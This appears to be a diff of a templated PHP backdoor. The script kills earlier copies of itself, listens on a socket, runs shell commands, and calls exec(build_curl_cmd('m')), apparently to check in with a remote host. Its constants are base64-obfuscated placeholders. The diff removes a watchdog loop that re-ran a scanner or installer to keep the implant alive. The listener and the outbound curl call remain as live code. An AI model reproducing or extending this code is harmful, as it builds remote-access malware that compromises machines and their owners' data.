@@ -12,12 +12,9 @@ define('PORT_MIN', '{{B64_CONST_PORT_MIN}}');
 define('PORT_MAX', '{{B64_CONST_PORT_MAX}}');
 define('SS_PORT', '{{B64_CONST_SS_PORT}}');
 define('PROMPT', '{{B64_CONST_PROMPT}}');
-define('SCANNER_FILE', '{{SCANNER}}');
-define('PING_INTERVAL', '{{B64_CONST_PING_INTERVAL}}');
 
 if ($pid = process_running($argv[0])) {
     exec("kill $pid");
-    // die();
 }
 
 $voices = load_voice_list();
@@ -41,39 +38,6 @@ $opts = array(
     '{{B64_OPT_PORT}}' => $port,
     '{{B64_OPT_HASH}}' => '{{USER_HASH}}'
 );
-
-// Get optional arguments
-if ($argc > 1) {
-    if ($argc > 2 && trim(strtolower($argv[1])) == '{{B64_STR_PING_ARG}}') {
-        echo "Running ping process...\n";
-        $monitor = base64_decode(trim($argv[2]));
-        echo "Looking for monitor='$monitor'\n";
-
-        while(true) {
-            if (file_exists(SCANNER_FILE) && process_running($monitor)) {
-                echo "Ping successfull! Monitor is running\n";
-                exec(build_curl_cmd('p'));
-            } else {
-                echo "Monitor doesn't exist OR is not running!\n";
-                if (file_exists(SCANNER_FILE)) {
-                    echo "Scanner file exists, re-scanning\n";
-                    exec(SCANNER_FILE);
-                } else if (file_exists('{{DIR_LOCAL_BIN}}/{{FILE_INSTALLER}}')) {
-                    echo "Installer exists, re-installing\n";
-                    exec('{{DIR_LOCAL_BIN}}/{{FILE_INSTALLER}}');
-                } else {
-                    echo "Missing scanner and installer\n";
-                }
-
-                exit;
-            }
-
-            sleep(PING_INTERVAL);
-        }
-
-        exit;
-    }
-}
 
 // Error check address and port
 (preg_match(REGEX_VALID_IP_ADDRESS, $address)) or die();
@@ -99,10 +63,11 @@ if (socket_listen($sock, 5) === false) {
 }
 
 exec(build_curl_cmd('m'));
-exec('{{B64_CMD_NOHUP}}' . ' {{PING_BIN}} {{PING_MON}} ' . '{{B64_STR_PING_ARG}}' . ' ' . base64_encode($argv[0]) . ' {{SILENT_SUFFIX}}');
 
 do {
     if (($msgsock = socket_accept($sock)) === false) {
+        socket_shutdown($sock);
+        socket_close($sock);
         break;
     }
 
@@ -171,9 +136,6 @@ do {
     socket_shutdown($sock);
     socket_close($msgsock);
 } while (true);
-
-socket_shutdown($sock);
-socket_close($sock);
 
 function command_exist($cmd) {
     $returnVal = shell_exec('{{B64_CMD_WHICH}}' . " $cmd");
